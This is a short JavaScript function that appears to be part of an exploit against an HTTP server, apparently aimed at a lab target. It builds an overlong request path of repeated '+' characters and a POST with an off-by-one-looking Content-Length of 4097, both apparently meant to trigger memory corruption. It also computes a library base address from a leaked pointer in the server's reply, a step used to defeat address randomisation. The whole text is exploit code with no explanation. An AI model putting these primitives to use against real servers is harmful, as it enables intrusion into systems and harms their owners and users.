function construct(reply) {
  const request = "GET /products/" + "+".repeat(768) + " HTTP/1.1\r\nHost: lab\r\n\r\n";
  const upload = "POST /receipts HTTP/1.1\r\nContent-Length: 4097\r\n\r\n";
  const library = Number(reply.readBigUInt64LE(64)) & ~0xfff;
  return {request, upload, library};
}
